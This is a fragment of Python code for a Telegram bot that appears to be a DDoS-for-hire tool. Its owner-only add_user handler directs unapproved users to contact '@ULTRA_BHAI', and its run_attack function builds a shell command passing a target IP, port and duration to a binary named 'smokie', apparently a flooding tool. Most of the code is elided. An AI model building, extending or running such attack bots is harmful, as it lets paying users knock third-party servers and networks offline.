...
async def add_user(update: Update, context: CallbackContext):
    ...
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ YOU NEED APPROVAL. CONTACT OWNER @ULTRA_BHAI.*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./smokie {ip} {port} {duration} 100 100"
